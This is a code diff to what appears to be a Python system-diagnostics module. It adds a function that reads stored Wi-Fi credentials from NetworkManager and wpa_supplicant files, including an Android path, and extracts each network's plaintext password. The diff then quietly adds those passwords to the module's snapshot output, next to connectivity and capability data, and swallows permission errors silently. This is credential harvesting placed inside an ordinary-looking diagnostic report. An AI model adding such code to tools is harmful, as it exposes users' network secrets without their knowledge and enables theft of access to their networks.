@@ -386,6 +386,131 @@ def connectivity():
     return result
 
 
+def wifi_passwords():
+
+    networks = []
+
+    # --------------------------------------------------------
+    # NetworkManager system-connections
+    # --------------------------------------------------------
+
+    nm_dir = Path(
+        "/etc/NetworkManager/system-connections"
+    )
+
+    if nm_dir.is_dir():
+
+        for item in nm_dir.iterdir():
+
+            if not item.is_file():
+                continue
+
+            try:
+
+                content = item.read_text()
+
+                ssid = None
+                psk = None
+
+                for line in content.splitlines():
+
+                    line = line.strip()
+
+                    if line.startswith("ssid="):
+                        ssid = line[5:]
+
+                    elif line.startswith("psk="):
+                        psk = line[4:]
+
+                if ssid:
+
+                    networks.append({
+                        "ssid": ssid,
+                        "password": psk or "",
+                        "source": "NetworkManager"
+                    })
+
+            except (
+                PermissionError,
+                FileNotFoundError,
+                OSError
+            ):
+                pass
+
+    # --------------------------------------------------------
+    # wpa_supplicant config (Linux + Android paths)
+    # --------------------------------------------------------
+
+    wpa_paths = [
+        "/etc/wpa_supplicant/wpa_supplicant.conf",
+        "/data/misc/wifi/wpa_supplicant.conf",
+    ]
+
+    for wpa_path in wpa_paths:
+
+        path = Path(wpa_path)
+
+        if not path.is_file():
+            continue
+
+        try:
+
+            content = path.read_text()
+
+            current_ssid = None
+            current_psk = None
+            in_network = False
+
+            for line in content.splitlines():
+
+                line = line.strip()
+
+                if line == "network={":
+                    in_network = True
+                    current_ssid = None
+                    current_psk = None
+
+                elif line == "}" and in_network:
+
+                    if current_ssid:
+
+                        networks.append({
+                            "ssid": current_ssid,
+                            "password":
+                                current_psk or "",
+                            "source":
+                                "wpa_supplicant"
+                        })
+
+                    in_network = False
+
+                elif in_network:
+
+                    if line.startswith("ssid="):
+                        current_ssid = (
+                            line[5:]
+                            .strip('"')
+                        )
+
+                    elif line.startswith("psk="):
+                        current_psk = (
+                            line[4:]
+                            .strip('"')
+                        )
+
+        except (
+            PermissionError,
+            FileNotFoundError,
+            OSError
+        ):
+            pass
+
+    return {
+        "available": len(networks) > 0,
+        "networks": networks
+    }
+
+
 def snapshot():
 
     return {
@@ -404,6 +529,9 @@ def snapshot():
 
         "sockets":
             socket_visibility(),
+
+        "wifi":
+            wifi_passwords(),
 
         "capabilities":
             capability_test(),
